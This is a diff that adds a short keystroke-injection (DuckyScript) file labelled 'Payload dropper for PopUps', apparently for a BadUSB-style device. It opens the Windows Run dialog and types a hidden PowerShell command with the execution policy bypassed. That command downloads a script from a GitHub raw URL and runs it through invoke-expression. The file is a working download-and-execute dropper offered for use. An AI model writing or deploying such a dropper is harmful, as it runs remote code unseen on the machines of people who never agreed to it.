@@ -1,0 +1,8 @@
+REM   Payload dropper for PopUps
+REM   Created by d0cax
+REM   Enjoy
+
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/d0cax/pop-ups/main/PopUps.ps1?dl=1; invoke-expression $pl
+ENTER
